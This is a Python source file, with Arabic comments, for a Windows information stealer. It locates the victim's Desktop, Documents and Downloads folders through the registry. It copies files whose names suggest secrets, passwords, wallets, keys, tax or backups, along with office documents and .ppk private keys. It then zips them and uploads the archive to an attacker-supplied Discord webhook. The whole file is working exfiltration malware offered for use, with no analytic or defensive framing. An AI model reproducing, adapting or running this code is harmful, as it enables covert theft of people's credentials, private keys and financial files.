import os
import shutil
import winreg
import requests
import zipfile

class Files:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.zipfile = os.path.join(os.getenv("TEMP"), f'Common-Files-{os.getlogin()}.zip')
        self.common_files()
        
    def common_files(self) -> None:
        def _get_user_folder_path(folder_name):
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders") as key:
                    value, _ = winreg.QueryValueEx(key, folder_name)
                    return value
            except FileNotFoundError:
                return None
            
        paths = [_get_user_folder_path("Desktop"), _get_user_folder_path("Personal"), _get_user_folder_path("{374DE290-123F-4565-9164-39C4925E467B}")]
        common_files = []

        # جمع الملفات من المسارات المحددة
        for search_path in paths:
            if os.path.isdir(search_path):
                for entry in os.listdir(search_path):
                    file_path = os.path.join(search_path, entry)
                    if os.path.isfile(file_path):
                        if (any([x in entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                            or entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".ods", ".json", ".ppk"))) \
                            and not entry.endswith(".lnk") \
                            and 0 < os.path.getsize(file_path) < 2 * 1024 * 1024: 
                            try:
                                os.makedirs(os.path.join(os.getenv("TEMP"), "Common Files"), exist_ok=True)
                                shutil.copy(file_path, os.path.join(os.getenv("TEMP"), "Common Files", entry))
                                common_files.append(os.path.join(os.getenv("TEMP"), "Common Files", entry))
                            except Exception as e:
                                print(f"Error copying file {entry}: {e}")
        
        # ضغط الملفات في ملف zip
        self.create_zip(common_files)

    def create_zip(self, files: list) -> None:
        """ضغط الملفات في ملف zip"""
        with zipfile.ZipFile(self.zipfile, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files:
                zipf.write(file, os.path.basename(file))
        self.send_to_webhook()

    def send_to_webhook(self):
        """إرسال الملف المضغوط إلى Webhook Discord"""
        with open(self.zipfile, 'rb') as file:
            data = {
                "content": "Here are some common files."
            }
            files = {
                "file": file
            }
            response = requests.post(self.webhook_url, data=data, files=files)
            if response.status_code != 204:
                print(f"Error sending file {self.zipfile}: {response.text}")
            else:
                print(f"Successfully sent file: {self.zipfile}")


# وضع رابط الـ Webhook الخاص بك في هذا المتغير
webhook_url = "WEBHOOKS_URL"

common_files_obj = Files(webhook_url)
